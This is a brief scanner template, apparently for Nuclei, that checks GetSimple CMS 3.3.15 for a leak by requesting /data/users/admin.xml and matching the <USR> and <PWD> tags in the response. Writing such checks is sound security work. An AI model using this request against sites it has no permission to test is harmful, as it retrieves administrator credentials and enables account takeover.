id: GetSimple-leakage

info:
  name: GetSimple CMS系统3.3.15版本信息泄露
  author: str1am
  severity: medium
  tags: GetSimple,leakage

requests:
  - method: GET
    path:
      - "{{BaseURL}}/data/users/admin.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<PWD>"
          - "<USR>"
        part: body
        condition: and
